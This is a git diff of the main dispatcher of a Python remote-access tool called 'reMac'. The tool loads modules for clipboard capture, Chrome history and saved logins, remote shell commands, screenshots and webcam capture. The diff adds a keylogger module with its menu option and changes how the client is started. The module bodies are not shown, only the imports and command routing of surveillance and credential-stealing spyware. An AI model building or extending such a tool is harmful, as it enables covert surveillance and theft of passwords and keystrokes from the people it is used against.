@@ -11,19 +11,21 @@ from modules import mod_chrome_logins
 from modules import mod_shellcmd
 from modules import mod_screenshot
 from modules import mod_webcam
+from modules import mod_keylogger
 
 # mymod = mod_hello.mod_hello()
 myreMac_server = reMac_server.reMac_server()
 myreMac_client = reMac_client.reMac_client()
 
 reMacModules = {
-    'helloWorld': mod_hello.mod_hello(),
+    'hw': mod_hello.mod_hello(),
     'cb': mod_clipboard.mod_clipboard(),
     'ch': mod_chrome_history.mod_chrome_history(),
     'cl': mod_chrome_logins.mod_chrome_logins(),
     'sh': mod_shellcmd.mod_shellcmd(),
     'sc': mod_screenshot.mod_screenshot(),
-    'wc': mod_webcam.mod_webcam()
+    'wc': mod_webcam.mod_webcam(),
+    'kl': mod_keylogger.mod_keylogger()
 }
 
 authorName = "JeteDonner"
@@ -48,19 +50,28 @@ def print_help():
     print(f'| -dev, -d\t\t\tStart developer mode                                 |')
     print(f'#========================================================================#')
 
+global clientStarted
+clientStarted = False
+
 def processInput(input):
+    # global clientStarted
+    # if clientStarted == True:
+    #     myreMac_client.start_client(input)
+    #     return
+
     if input == "q":# or input == "quit":
         sys.exit(1)
     elif input == "h":# or input == "help":
         print_help()
-    elif input == "helloWorld":  # or input == "help":
+    elif input == "hw":  # or input == "help":
         reMacModules[input].run_mod()
     elif input == "s":# or input == "help":
         myreMac_server.start_server()
     elif input == "c":# or input == "help":
         myreMac_client.start_client()
-        global clientStarted
         clientStarted = True
+    elif input == "kl":# or input == "help":
+        reMacModules[input].run_mod()
     elif input == "cb":# or input == "clipboard":
         if clientStarted == True:
             myreMac_client.start_client("cb")
@@ -90,7 +101,7 @@ def processInput(input):
 def enterWaitForInput(argv):
     while True:
         c = input("Select your option and press enter:")
-        processInput(c)
+        processInput(c.lower())
 
 if __name__ == "__main__":
     # print(f'Number of arguments:', len(sys.argv), 'arguments.')
